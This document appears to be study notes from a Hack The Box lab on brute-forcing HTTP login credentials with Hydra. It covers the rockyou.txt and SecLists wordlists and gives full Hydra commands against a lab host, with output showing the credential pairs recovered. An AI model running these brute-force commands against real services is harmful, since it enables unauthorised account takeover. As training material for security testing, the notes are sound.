---
title: c-Username Bruteforce
draft: false
tags:
---
## Wordlists

One of the most commonly used password wordlists is `rockyou.txt`, which has over 14 million unique passwords, sorted by how common they are, collected from online leaked databases of passwords and usernames.

```shell-session
jadu101@htb[/htb]$ locate rockyou.txt

/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

As for our usernames wordlist, we will utilize the following wordlist from `SecLists`:

```shell-session
jadu101@htb[/htb]$ locate names.txt

/opt/useful/SecLists/Usernames/Names/names.txt
```

## Username/Password Attack

`Hydra` requires at least 3 specific flags if the credentials are in one single list to perform a brute force attack against a web service:

1. `Credentials`
2. `Target Host`
3. `Target Path`

We can use the `-L` flag for the usernames wordlist and the `-P` flag for the passwords wordlist.

Tip: We will add the "-u" flag, so that it tries all users on each password, instead of trying all 14 million passwords on one user, before moving on to the next.

```shell-session
jadu101@htb[/htb]$ hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /

[DATA] max 16 tasks per 1 server, overall 16 tasks, 243854766 login tries (l:17/p:14344398), ~15240923 tries per task
[DATA] attacking http-get://178.35.49.134:32901/
[STATUS] 9105.00 tries/min, 9105 tries in 00:01h, 243845661 to do in 446:22h, 16 active

<...SNIP...>
[32901][http-get] host: 178.35.49.134   login: thomas   password: thomas1

[STATUS] attack finished for SERVER_IP (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

Above will take a lot of time.

## Username Bruteforce

If we know the password already, use `-p` flag to note it:

```shell-session
jadu101@htb[/htb]$ hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[DATA] max 16 tasks per 1 server, overall 16 tasks, 17 login tries (l:17/p:1), ~2 tries per task
[DATA] attacking http-get://178.35.49.134:32901/

[32901][http-get] host: 178.35.49.134   login: abbas   password: amormio
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra)
```

